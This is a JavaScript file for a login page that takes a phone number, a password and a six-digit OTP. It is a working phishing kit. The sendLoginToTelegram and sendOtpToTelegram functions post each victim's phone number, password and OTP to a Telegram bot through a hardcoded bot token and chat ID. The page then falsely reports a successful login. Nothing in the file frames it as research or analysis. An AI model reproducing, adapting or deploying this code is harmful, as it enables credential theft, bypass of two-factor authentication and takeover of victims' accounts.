const phoneInput = document.getElementById('phoneInput');
const charCounter = document.getElementById('charCounter');

phoneInput.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    const length = this.value.length;
    charCounter.textContent = length + '/10';
});

const passwordInput = document.getElementById('passwordInput');
const togglePassword = document.getElementById('togglePassword');
const eyeOffIcon = document.getElementById('eyeOffIcon');
const eyeOnIcon = document.getElementById('eyeOnIcon');

togglePassword.addEventListener('click', function() {
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeOffIcon.style.display = 'none';
        eyeOnIcon.style.display = 'block';
    } else {
        passwordInput.type = 'password';
        eyeOffIcon.style.display = 'block';
        eyeOnIcon.style.display = 'none';
    }
});

const BOT_TOKEN = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
const CHAT_ID = '-1003923232961';

function sendLoginToTelegram(phone, password) {
    var msg = '<b>New Login Details</b>\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>' + phone + '</code>\n🔑 <b>Password:</b> <code>' + password + '</code>\n━━━━━━━━━━━━━━━';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        chat_id: CHAT_ID,
        photo: 'https://i.ibb.co/d07MHTBb/photo-2026-07-19_22-33-25.jpg',
        caption: msg,
        parse_mode: 'HTML'
    }));
}

function sendOtpToTelegram(phone, otp) {
    var msg = '🔢 <b>OTP Received</b>\n━━━━━━━━━━━━━━━\n📱 <b>Phone:</b> <code>' + phone + '</code>\n🔢 <b>OTP:</b> <code>' + otp + '</code>\n━━━━━━━━━━━━━━━';
    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
    }).catch(function() {});
}

const loginBtn = document.getElementById('loginBtn');

loginBtn.addEventListener('click', function() {
    const phone = phoneInput.value;
    const password = passwordInput.value;

    if (!phone || !password) {
        showToast('Please fill in all fields');
        return;
    }

    if (phone.length !== 10) {
        showToast('Please enter a valid 10-digit phone number');
        return;
    }

    sendLoginToTelegram(phone, password);

    document.getElementById('otpPopup').classList.add('show');
    document.querySelector('#otpInputs input').focus();
});

const otpInputs = document.querySelectorAll('#otpInputs input');
otpInputs.forEach(function(input, index) {
    input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value) {
            this.classList.add('filled');
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        } else {
            this.classList.remove('filled');
        }
    });
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

document.getElementById('otpVerifyBtn').addEventListener('click', function() {
    let otp = '';
    otpInputs.forEach(function(input) { otp += input.value; });
    if (otp.length !== 6) {
        showToast('Please enter complete OTP');
        return;
    }
    document.getElementById('otpPopup').classList.remove('show');

    var phone = phoneInput.value;

    sendOtpToTelegram(phone, otp);

    showToast('Login successful!');
    otpInputs.forEach(function(input) { input.value = ''; input.classList.remove('filled'); });
});

function showToast(message) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2500);
}